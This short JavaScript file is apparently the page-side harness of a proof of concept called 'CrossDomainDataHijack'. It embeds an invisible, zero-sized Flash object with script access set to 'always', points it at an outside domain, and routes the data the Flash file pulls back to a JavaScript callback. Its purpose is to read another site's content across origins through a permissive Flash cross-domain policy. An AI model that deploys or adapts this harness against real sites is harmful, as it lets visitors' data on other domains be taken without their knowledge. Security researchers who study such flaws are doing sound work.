var crossdomain = {
    /*
     * Set the domain to reach.
     * @type string
     */
    'target' : '',
    /*
     * attributes for the object tag.
     * @type object
     */
    'attr': attr = {
        'id': 'myObject',
        'width': 0,
        'height': 0,
        'AllowScriptAccess': 'always'
    },
    /*
     * parameters for inside the object tag.
     * @type object
     */
    'param': param = {
        'AllowScriptAccess': 'always'
    },
    /*
     * The callback function receives all the data forwarded from the flash file.
     * @param string data
     * @return void
     */
    'callback': function (data) {
        console.log(data);
    },
    /*
     * This functions implements the flash object on the page.
     * @param string src
     * @return void
     */
    'create': function (src) {
        var i;
        this.attr.type = 'application/x-shockwave-flash';
        if (window.ActiveXObject) {
            this.attr.classid = 'clsid:d27cdb6e-ae6d-11cf-96b8-444553540000';
            this.param.movie = src;
        }
        else {
            this.attr.data = src;
        }

        var html = '<object';
        for (i in this.attr) {
            html += ' ' + i + '="' + this.attr[i] + '"';
        }
        html += '>';

        for (i in this.param) {
            html += '<param name="' + i + '" value="' + this.param[i] + '" />';
        }
        
        html += '</object>';
        document.write(html);
    },
    /*
     * Set the domain to target
     * @param string target
     * @return void
     */
    'setTarget' : function(target) {
        this.target = target;
    }
};
sendToJavaScript = crossdomain.callback;
crossdomain.setTarget('http://www.olivierbeg.nl/');
crossdomain.create('CrossDomainDataHijack.swf');
